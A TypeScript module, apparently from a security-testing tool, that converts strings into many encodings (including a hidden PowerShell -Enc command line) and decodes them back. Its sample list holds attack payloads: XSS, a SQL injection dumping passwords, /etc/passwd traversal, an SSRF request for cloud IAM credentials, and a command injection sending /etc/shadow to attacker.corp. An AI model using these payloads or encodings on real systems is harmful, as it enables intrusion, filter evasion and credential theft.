export interface EncodedVariants {
  plain: string;
  urlEncode: string;
  doubleUrlEncode: string;
  base64: string;
  base64Url: string;
  hexSpace: string;
  hex0x: string;
  hexSlashX: string;
  htmlEntityDecimal: string;
  htmlEntityHex: string;
  unicodeEscape: string;
  sqlChar: string;
  powershellBase64: string;
}

export function computeAllEncodings(input: string): EncodedVariants {
  const plain = input;

  // URL Encode
  let urlEncode = '';
  let doubleUrlEncode = '';
  try {
    urlEncode = encodeURIComponent(plain);
    doubleUrlEncode = encodeURIComponent(urlEncode);
  } catch {
    urlEncode = plain;
    doubleUrlEncode = plain;
  }

  // Base64 & Base64URL
  let base64 = '';
  let base64Url = '';
  try {
    const utf8Bytes = encodeURIComponent(plain).replace(/%([0-9A-F]{2})/g, (_, p1) =>
      String.fromCharCode(parseInt(p1, 16))
    );
    base64 = btoa(utf8Bytes);
    base64Url = base64.replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
  } catch {
    base64 = 'Error';
    base64Url = 'Error';
  }

  // Hex variations
  let hexSpace = '';
  let hex0x = '';
  let hexSlashX = '';
  try {
    const hexArr: string[] = [];
    for (let i = 0; i < plain.length; i++) {
      const h = plain.charCodeAt(i).toString(16).padStart(2, '0');
      hexArr.push(h);
    }
    hexSpace = hexArr.join(' ');
    hex0x = hexArr.map(h => '0x' + h).join(' ');
    hexSlashX = hexArr.map(h => '\\x' + h).join('');
  } catch {
    hexSpace = 'Error';
    hex0x = 'Error';
    hexSlashX = 'Error';
  }

  // HTML Entities
  let htmlEntityDecimal = '';
  let htmlEntityHex = '';
  try {
    for (let i = 0; i < plain.length; i++) {
      const code = plain.charCodeAt(i);
      htmlEntityDecimal += `&#${code};`;
      htmlEntityHex += `&#x${code.toString(16)};`;
    }
  } catch {
    htmlEntityDecimal = 'Error';
    htmlEntityHex = 'Error';
  }

  // Unicode Escape \u00xx
  let unicodeEscape = '';
  try {
    for (let i = 0; i < plain.length; i++) {
      const u = plain.charCodeAt(i).toString(16).padStart(4, '0');
      unicodeEscape += `\\u${u}`;
    }
  } catch {
    unicodeEscape = 'Error';
  }

  // SQL CHAR(...)
  let sqlChar = '';
  try {
    const codes: number[] = [];
    for (let i = 0; i < plain.length; i++) {
      codes.push(plain.charCodeAt(i));
    }
    sqlChar = `CHAR(${codes.join(',')})`;
  } catch {
    sqlChar = 'Error';
  }

  // PowerShell UTF-16LE Base64
  let powershellBase64 = '';
  try {
    const utf16Bytes: number[] = [];
    for (let i = 0; i < plain.length; i++) {
      const code = plain.charCodeAt(i);
      utf16Bytes.push(code & 0xff);
      utf16Bytes.push((code >> 8) & 0xff);
    }
    const binary = String.fromCharCode(...utf16Bytes);
    powershellBase64 = `powershell.exe -NoP -NonI -W Hidden -Enc ${btoa(binary)}`;
  } catch {
    powershellBase64 = 'Error';
  }

  return {
    plain,
    urlEncode,
    doubleUrlEncode,
    base64,
    base64Url,
    hexSpace,
    hex0x,
    hexSlashX,
    htmlEntityDecimal,
    htmlEntityHex,
    unicodeEscape,
    sqlChar,
    powershellBase64
  };
}

export function decodePayload(input: string, format: 'url' | 'base64' | 'hex' | 'html' | 'unicode'): string {
  const trimmed = input.trim();
  try {
    if (format === 'url') {
      return decodeURIComponent(trimmed);
    } else if (format === 'base64') {
      let b64 = trimmed.replace(/-/g, '+').replace(/_/g, '/');
      while (b64.length % 4 !== 0) b64 += '=';
      return atob(b64);
    } else if (format === 'hex') {
      const cleanHex = trimmed.replace(/0x|\\x|\s+/g, '');
      let str = '';
      for (let i = 0; i < cleanHex.length; i += 2) {
        str += String.fromCharCode(parseInt(cleanHex.substr(i, 2), 16));
      }
      return str;
    } else if (format === 'html') {
      const doc = new DOMParser().parseFromString(trimmed, 'text/html');
      return doc.documentElement.textContent || trimmed;
    } else if (format === 'unicode') {
      return trimmed.replace(/\\u([0-9a-fA-F]{4})/g, (_, hex) =>
        String.fromCharCode(parseInt(hex, 16))
      );
    }
  } catch (e: any) {
    return `[Erro na decodificação: ${e?.message || 'Formato incompatível'}]`;
  }
  return trimmed;
}

export const SAMPLE_ENCODER_PAYLOADS = [
  {
    name: 'XSS Script Tag',
    payload: '<script>alert(document.domain)</script>'
  },
  {
    name: 'SQL Injection Union',
    payload: "1' UNION SELECT null, username, password FROM users--"
  },
  {
    name: 'Directory Traversal',
    payload: '../../../../etc/passwd'
  },
  {
    name: 'SSRF Cloud Metadata',
    payload: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/'
  },
  {
    name: 'Command Injection Piping',
    payload: '; cat /etc/shadow | curl -X POST -d @- https://attacker.corp/log'
  }
];
